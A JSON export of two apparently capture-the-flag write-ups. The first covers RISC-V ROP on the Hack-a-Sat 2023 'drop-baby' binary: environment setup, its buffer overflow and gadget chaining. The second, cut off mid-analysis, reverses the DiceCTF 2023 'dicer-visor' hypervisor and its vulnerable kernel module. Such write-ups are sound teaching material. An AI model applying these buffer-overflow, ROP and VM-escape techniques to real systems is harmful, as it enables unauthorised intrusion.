{"pages":[{"date":"2023-05-05","image":"/post-resources/riscv-pwn/risc-v.png","imageAlt":"","link":"https://chalkiadakis.me/posts/hack-a-sat-23/riscv-pwn/","summary":"Setting up a pwntools environment for RISC-V using QEMU and chaining ROP gadgets.","tags":["ctf","environment setup","hack-a-sat","pwn","RISC-V"],"text":"this post is about creating a pwn environment for risc-v, exploiting risc-v binaries, and doing rop chains on risc-v. we will use as our target binary to pwn, the drop-baby binary from hack-a-sat ctf 2023.\nnikos@ctf-box:~$ file drop-baby drop-baby: elf 32-bit lsb executable, ucb risc-v, version 1 (sysv), statically linked, for gnu/linux 5.4.0, with debug_info, not stripped setting up an environment before we can begin diving into exploitation, we need to set up our risc-v pwning environment.\nwe will use qemu to emulate the binary, binfmt for seamless interaction with the binary, gdb-multiarch to debug it, pwntools to programmatically interact with it and write our exploit script, binutils-riscv64-linux-gnu for generating shellcode (assembler), and ropgadget to find rop gadgets in risc-v binaries. since this is cutting edge stuff, it is always recommended to run on the latest version.\nvanilla environment let\u0026rsquo;s start with the vanilla environment, so qemu, binfmt, binutils, and gdb:\nsudo apt update sudo apt-get install -y \\ binutils-riscv64-linux-gnu binutils-doc \\ binfmt-support \\ qemu qemu-utils \\ qemu-user qemu-user-static \\ qemu-system qemu-system-misc \\ gdb-multiarch sudo apt-get install gcc-riscv64-linux-gnu # optional. for using gcc to produce risc-v 64-bit binaries. pip install --upgrade pwntools ropgadget if everything has been done installed correctly, you should now have entries registered in binfmt about risc-v:\nnikos@ctf-box:~$ update-binfmts --display qemu-riscv32 (enabled): package = qemu-user-static type = magic offset = 0 magic = \\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\xf3\\x00 mask = \\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xfe\\xff\\xff\\xff interpreter = /usr/libexec/qemu-binfmt/riscv32-binfmt-p detector = qemu-riscv64 (enabled): package = qemu-user-static type = magic offset = 0 magic = \\x7f\\x45\\x4c\\x46\\x02\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\xf3\\x00 mask = \\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xfe\\xff\\xff\\xff interpreter = /usr/libexec/qemu-binfmt/riscv64-binfmt-p detector = and you should also be able to simply run the binary:\nnikos@ctf-box:~$ file drop-baby drop-baby: elf 32-bit lsb executable, ucb risc-v, rvc, double-float abi, version 1 (sysv), statically linked, for gnu/linux 5.4.0, with debug_info, not stripped nikos@ctf-box:~$ ./drop-baby no flag present you should also be able to run the binary under gdb-multiarch:\ngreat!\npwntools environment now, let\u0026rsquo;s make sure that pwntools with gdb also works (by default, in version \u0026lt;4.9.0, they won\u0026rsquo;t). let\u0026rsquo;s make a template pwntools and run it:\n# minimal-template.py # a minimal custom template for binary exploitation that uses pwntools. # run: # python minimal-template.py [debug] [gdb] from pwn import * # set up pwntools for the correct architecture. see `context.binary/arch/bits/endianness` for more context.binary = elfexe = elf(\u0026#39;./drop-baby\u0026#39;) print(context) def start(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;start the exploit against the target.\u0026#39;\u0026#39;\u0026#39; if args.gdb: return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw) else: target = process([elfexe.path] + argv, *a, **kw) return target # specify your gdb script here for debugging. gdb will be launched the gdb argument is given. gdbscript = \u0026#39;\u0026#39;\u0026#39; # init-gef # continue \u0026#39;\u0026#39;\u0026#39;.format(**locals()) arguments = [] io = start(arguments) io.interactive() io.close() nikos@ctf-box:~$ python minimal-template.py [*] \u0026#39;~/drop-baby\u0026#39; arch: riscv-32-little relro: partial relro stack: no canary found nx: nx enabled pie: no pie (0x10000) traceback (most recent call last): file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/context/__init__.py\u0026#34;, line 785, in arch defaults = self.architectures[arch] keyerror: \u0026#39;em_riscv\u0026#39; during handling of the above exception, another exception occurred: traceback (most recent call last): file \u0026#34;~/minimal-template.py\u0026#34;, line 8, in \u0026lt;module\u0026gt; context.binary = elfexe = elf(\u0026#39;./drop-baby\u0026#39;) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/context/__init__.py\u0026#34;, line 176, in fset self._tls[name] = validator(self, val) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/context/__init__.py\u0026#34;, line 872, in binary self.arch = binary.arch file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/context/__init__.py\u0026#34;, line 176, in fset self._tls[name] = validator(self, val) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/context/__init__.py\u0026#34;, line 787, in arch raise attributeerror(\u0026#39;attributeerror: arch must be one of %r\u0026#39; % sorted(self.architectures)) attributeerror: attributeerror: arch must be one of [\u0026#39;aarch64\u0026#39;, \u0026#39;alpha\u0026#39;, \u0026#39;amd64\u0026#39;, \u0026#39;arm\u0026#39;, \u0026#39;avr\u0026#39;, \u0026#39;cris\u0026#39;, \u0026#39;i386\u0026#39;, \u0026#39;ia64\u0026#39;, \u0026#39;m68k\u0026#39;, \u0026#39;mips\u0026#39;, \u0026#39;mips64\u0026#39;, \u0026#39;msp430\u0026#39;, \u0026#39;none\u0026#39;, \u0026#39;powerpc\u0026#39;, \u0026#39;powerpc64\u0026#39;, \u0026#39;riscv\u0026#39;, \u0026#39;s390\u0026#39;, \u0026#39;sparc\u0026#39;, \u0026#39;sparc64\u0026#39;, \u0026#39;thumb\u0026#39;, \u0026#39;vax\u0026#39;] hmm interesting. it seems that the pwnlib library knows about riscv' architecture but not about 'em_riscv' (upstream issue here). anyway, we know already that our system can run the binary so let\u0026rsquo;s add a small patch to the ~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/elf/elf.py file of the pwnlib library.\ndiff --git a/elf.py b/elf.py index c6e6708..7f89bd8 100644 --- a/elf.py +++ b/elf.py @@ -481,7 +481,8 @@ class elf(elffile): \u0026#39;em_ppc64\u0026#39;: \u0026#39;powerpc64\u0026#39;, \u0026#39;em_sparc32plus\u0026#39;: \u0026#39;sparc\u0026#39;, \u0026#39;em_sparcv9\u0026#39;: \u0026#39;sparc64\u0026#39;, - \u0026#39;em_ia_64\u0026#39;: \u0026#39;ia64\u0026#39; + \u0026#39;em_ia_64\u0026#39;: \u0026#39;ia64\u0026#39;, + \u0026#39;em_riscv\u0026#39;: \u0026#39;riscv\u0026#39; }.get(self[\u0026#39;e_machine\u0026#39;], self[\u0026#39;e_machine\u0026#39;]) @property let\u0026rsquo;s try running it again now:\nnikos@ctf-box:~$ python minimal-template.py [*] \u0026#39;~/drop-baby\u0026#39; arch: riscv-32-little relro: partial relro stack: no canary found nx: nx enabled pie: no pie (0x10000) contexttype(arch = \u0026#39;riscv\u0026#39;, binary = elf(\u0026#39;~/drop-baby\u0026#39;), bits = 32, endian = \u0026#39;little\u0026#39;, os = \u0026#39;linux\u0026#39;) [+] starting local process \u0026#39;~/drop-baby\u0026#39;: pid 5541 [*] switching to interactive mode no flag present [*] got eof while reading in interactive $ [*] process \u0026#39;~/drop-baby\u0026#39; stopped with exit code 255 (pid 5541) [*] got eof while sending in interactive great! the binary works with pwntools. let\u0026rsquo;s try pwntools+gdb now:\nnikos@ctf-box:~$ python minimal-template.py gdb [*] \u0026#39;~/drop-baby\u0026#39; arch: riscv-32-little relro: partial relro stack: no canary found nx: nx enabled pie: no pie (0x10000) contexttype(arch = \u0026#39;riscv\u0026#39;, binary = elf(\u0026#39;~/drop-baby\u0026#39;), bits = 32, endian = \u0026#39;little\u0026#39;, os = \u0026#39;linux\u0026#39;) [!] neither \u0026#39;qemu-riscv\u0026#39; nor \u0026#39;qemu-riscv-static\u0026#39; are available [error] argv must be strings or bytes: [none, \u0026#39;--help\u0026#39;] traceback (most recent call last): file \u0026#34;~/minimal-template.py\u0026#34;, line 26, in \u0026lt;module\u0026gt; io = start(arguments) file \u0026#34;~/minimal-template.py\u0026#34;, line 14, in start return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/context/__init__.py\u0026#34;, line 1578, in setter return function(*a, **kw) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/gdb.py\u0026#34;, line 539, in debug sysroot = sysroot or qemu.ld_prefix(env=env) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/context/__init__.py\u0026#34;, line 1578, in setter return function(*a, **kw) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/qemu.py\u0026#34;, line 162, in ld_prefix with process([path, \u0026#39;--help\u0026#39;], env=env) as io: file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/tubes/process.py\u0026#34;, line 258, in __init__ executable_val, argv_val, env_val = self._validate(cwd, executable, argv, env) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/tubes/process.py\u0026#34;, line 518, in _validate argv, env = normalize_argv_env(argv, env, self, 4) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/util/misc.py\u0026#34;, line 204, in normalize_argv_env log.error(\u0026#34;argv must be strings or bytes: %r\u0026#34; % argv) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/log.py\u0026#34;, line 439, in error raise pwnlibexception(message % args) pwnlib.exception.pwnlibexception: argv must be strings or bytes: [none, \u0026#39;--help\u0026#39;] from the error message neither 'qemu-riscv' nor 'qemu-riscv-static' are available, it seems that pwntools searches for the qemu-riscv and qemu-riscv-static binaries. let\u0026rsquo;s help it by making them point to qemu-riscv32 and qemu-riscv32-static correspondingly.\nnikos@ctf-box:~$ ln -s /usr/bin/qemu-riscv32 qemu-riscv nikos@ctf-box:~$ ln -s /usr/bin/qemu-riscv32-static qemu-riscv-static nikos@ctf-box:~$ export path=\u0026#34;$path:$(pwd)\u0026#34; nikos@ctf-box:~$ ls drop-baby minimal-template.py qemu-riscv qemu-riscv-static flag.txt let\u0026rsquo;s try again now:\nperfect! our rsic-v pwning environment complete and we can start exploiting (finally)!\nsource code i won\u0026rsquo;t bore you with the reversing of the drop-baby binary. the goal is to get the flag and with that let\u0026rsquo;s jump straight into the buggy code:\nint main() { setvbuf(stdout,null,2,0); char *flag = getenv(\u0026#34;flag\u0026#34;); if (flag == null) { puts(\u0026#34;no flag present\u0026#34;); exit(-1); } //crete flag.txt file. //read and write permissions for the owner of the file, and with no permissions for other users. int flag_fd = open(\u0026#34;flag.txt\u0026#34;, o_creat | o_wronly, 384); if (flag_fd \u0026lt; 0) { printf(\u0026#34;errno = %d trying to open flag.txt\\n\u0026#34;, errno); exit(-1); } size_t svar2 = write(flag_fd,flag,strlen(flag)); if (svar2 != strlen(flag)) { puts(\u0026#34;unable to write flag to file\u0026#34;); exit(-1); } close(flag_fd); //!!! bug: environment variable `flag` does not get wiped from memory. so, even if unsetenv //is invoked, the value of the `flag` environment variable is still somewhere on the stack. if (unsetenv(\u0026#34;flag\u0026#34;) == -1) { puts(\u0026#34;unable to clear environment\u0026#34;); exit(-1); } //setup timeout signal based on `timeout` environment variable. ulong timeout; char *timeout_str = getenv(\u0026#34;timeout\u0026#34;); if (timeout_str == null) { timeout = 10; } else { timeout = strtoul(timeout_str,null,10); if (timeout == 0) { timeout = 10; } } signal(0xe,alarm_handler); //puts(\u0026#34;time\\\u0026#39;s up!\u0026#34;); exit(1); alarm(timeout); puts(\u0026#34;\\nbaby\\\u0026#39;s second risc-v stack smash\\n\u0026#34;); puts(\u0026#34;no free pointers this time and pwning might be more difficult!\u0026#34;); puts(\u0026#34;exploit me!\u0026#34;); do { if (syncronize() == -1) //`synchronize()` expects the following input: `\\xde\\xad\\xbe\\xef` return -1; int res = read_message(); } while (res != -1); return -1; } int read_message(void) { char control_chr; ssize_t nread = read(0,\u0026amp;control_chr,1); if (nread != 1) return -1; //`control_chr` can be one of the following: // \u0026#39;\\xa1\u0026#39;, \u0026#39;\\xa2\u0026#39;, \u0026#39;\\xb1\u0026#39;, \u0026#39;\\xb2\u0026#39; //only \u0026#39;\\xb2\u0026#39; is relevant to us. if (control_chr == \u0026#39;\\xb2\u0026#39;) { return do_b2(); } else { //... } return -1; } int do_b2() { char acstack_78 [100]; if (read(0,acstack_78,sz) \u0026lt; 300) { //!!! bug: bufferoverflow here. return -1; } if (check_message_crc(acstack_78,300) == -1) //dumb crc32 check. last 4 bytes of input is the crc32. return -1; return 0; } here are the juicy parts from the code above:\nthe binary reads two environment variables: flag and timeout. timeout is (classically) used to prevent us from leaving open connections to the remote (nothing fancy). if not specified, it defaults to 10 seconds, so for our exploitation we will set it to something much higher (3600). flag environment variable contains the flag value and writes it to the file flag.txt the unsetenv(\u0026quot;flag\u0026quot;) function simply unsets the environment variable. however, it does not erase the memory. it simply shifts the all the elements in the char *environ[] array to the left by 1 (setenv.c#264). this means that the flag is still somewhere down the stack. syncronize() is a boring state machine. required input is \\xde\\xad\\xbe\\xef. read_message() is where the program will read commands from us. command b2 reads 300 bytes into a buffer of 100 bytes. this is a buffer overflow. now that we have identified the location of the buffer overflow and how to reach it, it is time to come up with a strategy to pwn the binary.\ndetour to risc-v architecture and abi before we attempt to exploit this buffer overflow, we need to understand our target architecture. more specifically:\nwhat is the function call convention? how are arguments passed to functions? how is the control flow transferred to a function how does a function return to its caller what is the syscall abi? how are arguments passed to syscalls how does the stack behave? which are caller/callee saved registers? which are our registers? how does the assembly of risc-v look like? how do we access memory? only if we know the answer to the above questions we can start thinking about exploiting and roping. otherwise, we simply do not know how to control the program counter, how gadgets look like, and how to chain them together!\nregisters all register definitions\ndatatypes function call convention function call convention risc-v has a little-endian memory system. in the standard risc-v calling convention, the stack grows downward and the stack pointer is always kept 16-byte aligned. function arguments are passed arguments in registers when possible. up to eight integer registers, a0-a7 return value is passed in registers a0 and a1. here is a simple example compiled using godbolt.org:\nint myfunc(int arg) { int i; i=arg+0x20; return i; } int main() { myfunc(0x10); return 0; } myfunc(int)-0x2: nop r_riscv_align *abs*+0x2 myfunc(int): addi\tsp,sp,-16\t# allocate stack sw\tra,12(sp)\t# store return address sw\ts0,8(sp)\t# store frame pointer addi\ts0,sp,16\t# s0=sp sw\ta0,-12(s0)\t# save arg0 # do the opration lw\ta0,-12(s0) addi\ta0,a0,0x20 sw\ta0,-16(s0) # return lw\ta0,-16(s0)\t# return value lw\tra,12(sp)\t# return address lw\ts0,8(sp)\t# restore frame pointer addi\tsp,sp,16\t# deallocate stack ret\t# pseudo-instruction: jalr x0, ra, 0 main: addi\tsp,sp,-16 sw\tra,12(sp) sw\ts0,8(sp) addi\ts0,sp,16 li\ta0,0 sw\ta0,-16(s0) sw\ta0,-12(s0) # prepare for function call to myfunc() li\ta0,0x10\t# setup arg1 # compute address of myfunc using relative addressing # and then call it using jalr auipc\tra,0x0 r_riscv_call_plt myfunc(int) r_riscv_relax *abs* jalr\tra\t# 3a \u0026lt;main+0x14\u0026gt; lw\ta0,-16(s0) lw\tra,12(sp) lw\ts0,8(sp) addi\tsp,sp,16 ret other risc-v assembly programmer\u0026rsquo;s manual - very good resource. risc-v instruction set cheatsheet risc-v instruction set reference pseudo-instructions assembler directives relative/absolute addressing, labels, got accessing load \u0026amp; store pwning now that we know our architecture, let\u0026rsquo;s identify the binary\u0026rsquo;s security properties and come up with an exploitation strategy:\nnikos@ctf-box:~$ checksec --file=./drop-baby [*] \u0026#39;~/drop-baby\u0026#39; arch: riscv-32-little relro: partial relro stack: no canary found nx: nx enabled pie: no pie (0x10000) great, no pie!. let\u0026rsquo;s search for useful gadgets using ropgadget. generally, we want to control:\na0,a1,a2,... when making function calls as these are the argument registers ra as this is the return address where a function call should return when finished find jr and jalr gadgets as these will compose our rop chain. also, we notice in the disassembly that many instructions start with the c. prefix. these are compressed 16-bit instructions (rcv) instead of the regular 32-bit instructions and are referred in the \u0026ldquo;c\u0026rdquo; standard extension for compressed instructions in the risc-v isa:\nthe \u0026ldquo;c\u0026rdquo; extension can be added to any of the base isas (rv32,\nrv64, rv128), and we use the generic term “rvc” to cover any of these. typically, 50%–60% of the risc-v instructions in a program can be replaced with rvc instructions, resulting in a 25%–30% code-size reduction.\nrvc uses a simple compression scheme that offers shorter 16-bit versions of common 32-bit risc-v instructions\nthe c extension is compatible with all other standard instruction extensions. the c extension allows 16-bit instructions to be freely intermixed with 32-bit instructions, with the latter now able to start on any 16-bit boundary.\nhere is a one liner to search for gadgets in our binary:\nropgadget --binary drop-baby --align 4 \\ | grep -e \u0026#39;sw|swsp|lw|lwsp|mv|sub|add|xor|jr|jalr|ret|ecall\u0026#39; \\ | grep -e \u0026#39;; (ret)|((c\\.)?j(al)?r (x[0-9]{1,2}|zero|ra|sp|gp|tp|s[0-9]{1,2}|t[0-6]|fp|a[0-7]))$\u0026#39; \\ | tee gadgets.log the first regex will filter gadgets that have only relevant opcodes to us. the second regex is about how the gadget should end. all of our gadgets will end with either jr or jalr with a register as argument. ret is the same as jalr x0, ra, 0 ret is the same as jr ra if we are doing function calls, we want our gadgets to not end with j(al)?r ra. this is because the function call will use the ra register in the ret instruction to return to our next rop gadget. we are interested in the lwsp gadgets as these gadgets can directly load values from the stack (which we control) into our registers ecall is uses for invoking syscalls, but we have libc statically linked so we don\u0026rsquo;t use it. since our binary supports the c. prefix, we can also --align 2 instead of 4. here are some example good quality gadgets:\n# control a bunch or registers 0x0001a7e8: c.lwsp ra, 0x2c(sp) ; c.lwsp s0, 0x28(sp) ; c.lwsp s1, 0x24(sp) ; c.lwsp s2, 0x20(sp) ; c.lwsp s3, 0x1c(sp) ; c.lwsp s5, 0x14(sp) ; c.lwsp s6, 0x10(sp) ; c.lwsp s7, 0xc(sp) ; c.lwsp s8, 8(sp) ; c.mv a0, s4 ; c.lwsp s4, 0x18(sp) ; c.addi16sp sp, 0x30 ; c.jr ra # control a0, a1, a2 function arguments 0x00026900: c.lwsp a2, 0x10(sp) ; c.lwsp a1, 0x18(sp) ; c.lwsp a0, 0x14(sp) ; c.mv a5, s8 ; c.li a6, 0 ; c.li a4, 0 ; c.mv a3, s6 ; c.jalr s0 # gadget that does not use `ra` to jump. # instead, it controls `ra`, so we can return from a function call back # to our rop chain. 0x0001a410: c.lwsp ra, 0x1c(sp) ; c.addi16sp sp, 0x20 ; c.jr a5 with the lwsp instructions we can load arbitrary values into registers and with the addi16sp we can increase the stack pointer. the jr and jalr use a register to jump, whcih we we can control with lwsp, and thus we can link gadgets togeather.\nnow for the rop chain payload we have two solutions:\nsolution-cheesy.py - abuses the fact that the flag is still somewhere in the stack. it finds the address of the flag in the stack and then does puts(flag). solution.py - more hardcore rop solution. it performs the following function calls with a rop chain: fd=open(\u0026#34;flag.txt\u0026#34;, o_rdonly); read(fd, buf, 0x100); write(1, buf, 0x100); //write to stdout after each function call, we re-trigger the buffer overflow as the whole rop chain does not fit into the 300 bytes that we can write. when we execute our rop chain, we get the flag!\n","title":"ROPing on RISC-V - hack-a-sat23"},{"date":"2023-02-10","image":"/post-resources/pacman.png","imageAlt":"","link":"https://chalkiadakis.me/posts/dicectf23/dice-visor/","summary":"Surviving the trip from userland, to kernel, to hypervisor.","tags":["ctf","diceCTF","hypervisor","pwn"],"text":"categories: pwn\ndescription:\nwelcome to dicegang\u0026rsquo;s newest hypervisor-based security solution, dicer-visor.\nnc mc.ax 31313\nauthor: smoothhacker\ninitramfs.cpio.gz dicer-visor bzimage\nrecon for this challenge, we are given 3 files: a kernel image, an initramfs, and the dicer-visor binary which is the hypervisor itself.\nfane@ctf-box:~/dicer-visor$ file dicer-visor dicer-visor: elf 64-bit lsb pie executable, x86-64, version 1 (sysv), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, buildid[sha1]=f9ef7fc5756088242c50b7f6b1dbee7ccee624de, for gnu/linux 3.2.0, not stripped fane@ctf-box:~/dicer-visor$ ./dicer-visor usage: ./dicer-visor \u0026lt;bzimage\u0026gt; \u0026lt;initrd\u0026gt; let\u0026rsquo;s run the challenge locally:\nfane@ctf-box:~/dicer-visor$ ./dicer-visor bzimage initramfs.cpio.gz dicer-visor - dicegang security hypervisor [*] created vm [*] loaded kernel image: bzimage [*] loaded initrd image: initramfs.cpio.gz [*] starting up vm booting from rom... [ 0.000000] linux version 6.0.0 (scott@blackrock) (gcc (ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, gnu 3 [ 0.000000] command line: console=ttys0 nokaslr [ 0.000000] x86/fpu: supporting xsave feature 0x001: \u0026#39;x87 floating point registers\u0026#39; [ 0.000000] x86/fpu: supporting xsave feature 0x002: \u0026#39;sse registers\u0026#39; ... [ 0.468004] run /init as init process /init: line 7: can\u0026#39;t create /sys/module/rcutree/parameters/rcu_cpu_stall_suppress: nonexistent directy [ 0.528008] vuln: loading out-of-tree module taints kernel. [ 0.532008] [!] vulnerable driver loaded /bin/sh: can\u0026#39;t access tty; job control turned off / # uname -a linux (none) 6.0.0 #15 fri feb 3 13:31:55 utc 2023 x86_64 gnu/linux / # so, the binary spawns a vm with the given initramfs and drops us to a shell. the vm is running a kernel version 6.0.0 and from the logs we also see that it loads a weird kernel module ([!] vulnerable driver loaded). inside the initramfs, we find the vuln.ko kernel module which we will analyze in a bit. we also can see the contents of init:\n/ # cat init #!/bin/sh #mount -t proc none /proc #mount -t sysfs none /sys #mount -t debugfs none /sys/kernel/debug echo 1 \u0026gt; /sys/module/rcutree/parameters/rcu_cpu_stall_suppress /sbin/insmod /vuln.ko mknod /dev/exploited-device c 32 0 exec /bin/sh / # interesting! the vuln.ko kernel module is loaded and the character device /dev/exploited-device is created. but what is the exploitation strategy here? probably we need to interact with vuln.ko from inside the vm, which in turn will interact with the hypervisor, and we have to exploit that latter interaction. let\u0026rsquo;s also try running on remote:\nwhen we connect to the remote, it asks us for a url to download an initramfs and then spawns the vm. when providing the original initramfs, after the vm loads, we get a kernel panic, probably crashing at exec /bin/sh in init. this is because on the remote side they probably have deleted the contents of /bin/* to avoid easy exploitation. so, let\u0026rsquo;s start analyzing the challenge files.\nanalysis - vuln.ko first, let\u0026rsquo;s extract the initramfs and load the vuln.ko in ghidra. we first analyze the entry and exit points of the kernel module which are init_module and cleanup_module respectively:\nvoid init_module(void) { long lvar1; __register_chrdev(0x20,0,0x100,\u0026#34;exploited-device\u0026#34;,fops); lvar1 = __request_region(\u0026amp;ioport_resource,0xdead,1,\u0026#34;exploited-device\u0026#34;,0); if (lvar1 == 0) { _printk(\u0026#34;\\x011[!] io port allocation of 0x%x failed\\n\u0026#34;,0xdead); } else { lvar1 = __request_region(\u0026amp;ioport_resource,0xd1ce,1,\u0026#34;exploited-device\u0026#34;,0); if (lvar1 == 0) { _printk(\u0026#34;\\x011[!] io port allocation of 0x%x failed\\n\u0026#34;,0xd1ce); } else { _printk(\u0026#34;\\x011[!] vulnerable driver loaded\\n\u0026#34;); } } __x86_return_thunk(); return; } void cleanup_module(void) { __x86_return_thunk(); return; } as we can see, the init_module creates the character device /dev/exploited-device with major number 32, base minor 0, and 0x100 minor numbers available to it (docs/__register_chrdev). next, it creates to regions for this device, both with size 1 byte. the first region is ad address 0xdead and the second region at address 0xd1ce (docs/__request_region).\nthe fops variable in __register_chrdev(), is a global variable that defines what operations are allowed on the character devices and how it should behave under these operations. usually, userland applications interact with the device through the /dev filesystem and file descriptors. from the init file, you should recall the line mknod /dev/exploited-device c 32 0, which makes a special character device with the same major and minor numbers as in the __register_chrdev() call.\nback to the fops variable. this variable is of type struct file_operations and is basically a big list of function pointers. these function pointers describe how the character device behaves when interacted as a file through /dev/exploited-device, e.g. via open, read, ioctl, etc.\nso, let\u0026rsquo;s examine all the registered function pointers in fops:\nchar shellcode[256]; //global variable int open(struct inode *, struct file *) { return 0; } void release(struct inode *, struct file *) { return 0; } ssize_t read(struct file *, char __user *, size_t, loff_t *) { return 0; } ssize_t write(struct file *, const char __user * __buf, size_t __n, loff_t *) { size_t copy_sz; ssize_t svar1; copy_sz = min(__n, 0x100); _copy_from_user(shellcode,__buf,copy_sz); svar1 = __x86_return_thunk(); return svar1; } void tl_ioctl(struct file *file, unsigned int cmd, unsigned long) { long i; _printk(\u0026#34;\\x011[!] driver ioctl issued - cmd: %d\\n\u0026#34;, cmd); if (cmd == 0xbeef) { out(0xd1ce,0xd1ce); //out dx,ax native_io_delay(); } else if (cmd == 0xdead) { for(i=0; i\u0026lt;0x100; i++) { out(0xdead,shellcode[i]); //out dx,al native_io_delay(); } } return 0; } so, to summarize the above operations:\nopen: noop. release: noop read: noop write: writes to the global shellcode kernel buffer up to 0x100 bytes provided by the userland buf. ioctl: the out that appear in the body of the function, are x86-specific assembly instructions. these instructions are used for port i/o, i.e. communication with hardware peripherals. since we are running inside a vm, we expect that these instructions will cause a trap to the hypervisor. (usually the vm runs at a lower privilege level than these instructions can be executed [1, 2, 3]) so, the ioctl command 0xbeef writes to the i/o port 0xd1ce the value d1ce; and the iotctl command 0xdead writes to the i/o port 0xdead the shellcode buffer (0x100 bytes). now it\u0026rsquo;s time to analyze the hypervisor!\nanalysis - dice-visor fane@ctf-box:~/dicer-visor$ file dicer-visor dicer-visor: elf 64-bit lsb pie executable, x86-64, version 1 (sysv), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, buildid[sha1]=f9ef7fc5756088242c50b7f6b1dbee7ccee624de, for gnu/linux 3.2.0, not stripped fortunately, the hypervisor still has symbols as it is not stripped. let\u0026rsquo;s start the analysis from the main function:\nint main(int argc,char **argv) { int ivar1; char *err_msg; int aistack72 [2]; int fd; setvbuf(stdout,(char *)0x0,2,0); setvbuf(stdin,(char *)0x0,2,0); setvbuf(stderr,(char *)0x0,2,0); if (argc != 3) { fwrite(\u0026#34;usage: ./dicer-visor \u0026lt;bzimage\u0026gt; \u0026lt;initrd\u0026gt;\\n\u0026#34;,0x28,1,stderr); return -1; } puts(\u0026#34;dicer-visor - dicegang security hypervisor\u0026#34;); fd = open(\u0026#34;/dev/kvm\u0026#34;,0x80002); if (fd == -1) { return err(1, \u0026#34;/dev/kvm\u0026#34;); } else { ivar1 = ioctl(fd,0xae00,0); if (ivar1 == 0xc) { init_vm(aistack72); puts(\u0026#34;[*] created vm\u0026#34;); load_vm((long)aistack72,argv[1],argv[2]); printf(\u0026#34;[*] loaded kernel image: %s\\n\u0026#34;,argv[1]); printf(\u0026#34;[*] loaded initrd image: %s\\n\u0026#34;,argv[2]); puts(\u0026#34;[*] starting up vm\u0026#34;); run_vm(aistack72); cleanup_vm(aistack72); puts(\u0026#34;[*] exited vm\u0026#34;); return 0; } else if (ivar1 != -1) { return err(1,\u0026#34;kvm_get_api_version %d, expected 12\u0026#34;,ivar1); } return err(1, \u0026#34;kvm_get_api_version\u0026#34;); } } as we see, the hypervisors uses the kernel\u0026rsquo;s kvm api to create the virtual machine. init_vm performs a lot of ioctl system calls, while load_vm does not perform any ioctl and simply mmaps the bzimage and the initramfs, sets some state variables in aistack72, and then returns. the value 0xae00 in the ioctl, corresponds to the #define kvm_get_api_version _io(kvmio, 0x00), where kvmio holds the value 0xae. with a little bit of manual reverse engineering effort, we recover the struct for aistack72 and also have a clean decompilation of the whole hypervisor:\n// ghidra-kvm.h contains struct definitions and macro #defines related to the kvm api. // extracted from the source code of the linux kernel. // e.g. from https://elixir.bootlin.com/linux/v6.0/source/include/uapi/linux/kvm.h // consult the kernel source code and its documentation for what the structs are. // file located in solution/ghidra-kvm.h #include \u0026#34;ghidra-kvm.h\u0026#34; struct vm { int vm_fd; int vcpu_fd; int kvm_fd; undefined[4] padding; void *userspace_address; } undefined8 init_vm(struct vm *vm); undefined8 load_vm(struct vm *vm,char *bzimage_path,char *initramfs_path); undefined8 run_vm(struct vm *vm); undefined8 cleanup_vm(struct vm *vm); int main(int argc,char **argv) { int ivar1; char *pcvar2; struct vm vm; setvbuf(stdout,(char *)0x0,2,0); setvbuf(stdin,(char *)0x0,2,0); setvbuf(stderr,(char *)0x0,2,0); if (argc != 3) { fwrite(\u0026#34;usage: ./dicer-visor \u0026lt;bzimage\u0026gt; \u0026lt;initrd\u0026gt;\\n\u0026#34;,0x28,1,stderr); return -1; } puts(\u0026#34;dicer-visor - dicegang security hypervisor\u0026#34;); vm.kvm_fd = open(\u0026#34;/dev/kvm\u0026#34;,0x80002); if (vm.kvm_fd == -1) { return err(1, \u0026#34;/dev/kvm\u0026#34;); } else { ivar1 = ioctl(vm.kvm_fd,kvm_get_api_version ,0); if (ivar1 == 0xc) { init_vm(\u0026amp;vm); puts(\u0026#34;[*] created vm\u0026#34;); load_vm(\u0026amp;vm,argv[1],argv[2]); printf(\u0026#34;[*] loaded kernel image: %s\\n\u0026#34;,argv[1]); printf(\u0026#34;[*] loaded initrd image: %s\\n\u0026#34;,argv[2]); puts(\u0026#34;[*] starting up vm\u0026#34;); run_vm(\u0026amp;vm); cleanup_vm(\u0026amp;vm.vm_fd); puts(\u0026#34;[*] exited vm\u0026#34;); return 0; } else if (ivar1 != -1) { return err(1,\u0026#34;kvm_get_api_version %d, expected 12\u0026#34;,ivar1); } return err(1,\u0026#34;kvm_get_api_version\u0026#34;); } } /* warning: could not reconcile some variable overlaps */ undefined8 init_vm(struct vm *vm) { int ivar1; void *userspace_addr; char *pcvar2; undefined8 local_70; struct kvm_userspace_memory_region kvm_userspace_memory_region; kvm_pit_config 